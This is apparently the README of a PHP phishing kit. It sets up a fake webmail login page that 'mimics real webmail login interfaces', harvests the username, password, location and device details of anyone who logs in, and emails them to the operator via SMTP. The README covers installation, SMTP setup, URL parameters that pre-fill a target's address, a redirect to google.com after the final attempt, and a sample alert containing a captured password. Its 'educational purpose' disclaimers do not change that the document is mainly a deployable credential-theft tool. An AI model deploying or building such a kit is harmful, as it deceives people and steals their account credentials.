# Webmail Login Demo with SMTP Logging

A PHP-based webmail login page for educational purposes that captures login attempts and sends notifications via SMTP instead of Telegram API.

## ⚠️ Educational Purpose Only

This project is designed for educational and security research purposes only. Use responsibly and ensure you have proper authorization before deploying or collecting any credentials.

## Features

- 🎨 **Authentic Design**: Mimics real webmail login interfaces
- 📧 **SMTP Integration**: Sends detailed logs via email instead of Telegram
- 🌍 **Location Tracking**: Captures user's geographical location
- 📱 **Device Information**: Logs user agent and technical details
- 🔒 **Session Management**: Tracks multiple login attempts
- 📊 **JSON Logging**: Stores attempts in local JSON file
- 🚀 **Modern UI**: Responsive design with smooth animations

## Requirements

- PHP 7.4 or higher
- Web server (Apache/Nginx)
- PHPMailer library
- Valid SMTP credentials (Gmail, Outlook, etc.)

## Installation

### Method 1: Using Composer (Recommended)

1. **Clone/Download the files**
2. **Install PHPMailer via Composer:**
   ```bash
   composer install
   ```

### Method 2: Manual Installation

1. **Download PHPMailer manually:**
   ```bash
   wget https://github.com/PHPMailer/PHPMailer/archive/v6.8.0.zip
   unzip v6.8.0.zip
   mv PHPMailer-6.8.0/src PHPMailer/src
   ```

## Configuration

### 1. SMTP Settings

Edit the configuration in `webmail_login.php`:

```php
$config = [
    'smtp' => [
        'host' => 'smtp.gmail.com',        // Your SMTP server
        'port' => 587,                     // SMTP port
        'username' => 'your-email@gmail.com',  // Your email
        'password' => 'your-app-password',     // App password
        'encryption' => 'tls',             // TLS or SSL
        'from_name' => 'Webmail Security System'
    ],
    'notification' => [
        'email' => 'admin@yourdomain.com', // Where to send logs
        'subject' => 'Webmail Login Attempt - {{timestamp}}'
    ],
    'app' => [
        'log_file' => 'login_attempts.json',
        'max_attempts' => 5,
        'redirect_url' => 'https://google.com'
    ]
];
```

### 2. Gmail Setup (Most Common)

For Gmail, you need to:

1. **Enable 2-Factor Authentication**
2. **Generate App Password:**
   - Go to Google Account settings
   - Security → 2-Step Verification → App passwords
   - Generate a new app password
   - Use this password in the configuration

### 3. Other Email Providers

**Outlook/Hotmail:**
```php
'host' => 'smtp-mail.outlook.com',
'port' => 587,
'encryption' => 'tls'
```

**Yahoo:**
```php
'host' => 'smtp.mail.yahoo.com',
'port' => 587,
'encryption' => 'tls'
```

## Usage

### 1. Basic Usage

1. **Upload files to your web server**
2. **Configure SMTP settings**
3. **Access the page:**
   ```
   https://yourserver.com/webmail_login.php
   ```

### 2. URL Parameters

**Email parameter:**
```
https://yourserver.com/webmail_login.php?email=target@example.com
```

**Hash-based email:**
```
https://yourserver.com/webmail_login.php#target@example.com
```

**Base64 encoded email:**
```
https://yourserver.com/webmail_login.php#dGFyZ2V0QGV4YW1wbGUuY29t
```

## Email Notification Format

The system sends detailed HTML emails with:

```
📥 Webmail Login Attempt 2025 📥

📧 Credentials:
   Email: user@example.com
   Password: userpassword123

📍 Location Details:
   🌆 City: New York
   🌇 Region: New York
   🗾 Country: US

🤳 Technical Details:
   🌏 IP Address: 192.168.1.100
   📱 User Agent: Mozilla/5.0...
   🕒 Timestamp: 2025-01-02 10:30:45
   🔄 Attempt #: 3
```

## File Structure

```
webmail-demo/
├── webmail_login.php      # Main login page
├── config.php            # Configuration file
├── error.php             # Error page
├── composer.json         # Composer dependencies
├── README.md             # This file
├── login_attempts.json   # Log file (created automatically)
└── vendor/               # Composer packages
    └── phpmailer/
```

## Security Features

- **Input Sanitization**: All inputs are filtered and sanitized
- **Session Management**: Tracks attempts per session
- **Rate Limiting**: Redirects after maximum attempts
- **XSS Protection**: HTML entities escaped
- **CSRF Protection**: Session-based validation

## Troubleshooting

### Common Issues

1. **Emails not sending:**
   - Check SMTP credentials
   - Verify app password (for Gmail)
   - Check firewall/port restrictions
   - Enable "Less secure apps" if needed

2. **Location not working:**
   - Check internet connection
   - ipinfo.io API might be rate-limited
   - Consider using alternative APIs

3. **PHPMailer errors:**
   - Ensure PHPMailer is properly installed
   - Check PHP error logs
   - Verify SMTP server connectivity

### Debug Mode

Enable debug mode by adding to configuration:
```php
'app' => [
    'debug' => true,
    // ... other settings
]
```

## Legal Disclaimer

- ⚖️ **Legal Use Only**: Only use with proper authorization
- 🎓 **Educational Purpose**: Designed for learning and research
- 🚫 **No Malicious Use**: Do not use for unauthorized access
- ✅ **Responsible Disclosure**: Report vulnerabilities responsibly

## License

This project is for educational purposes only. Use responsibly and in accordance with applicable laws and regulations.

## Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

## Support

For educational purposes and security research only. Please use responsibly and ensure you have proper authorization before deployment.

---

**Remember**: Always obtain proper authorization before using this tool and comply with all applicable laws and regulations.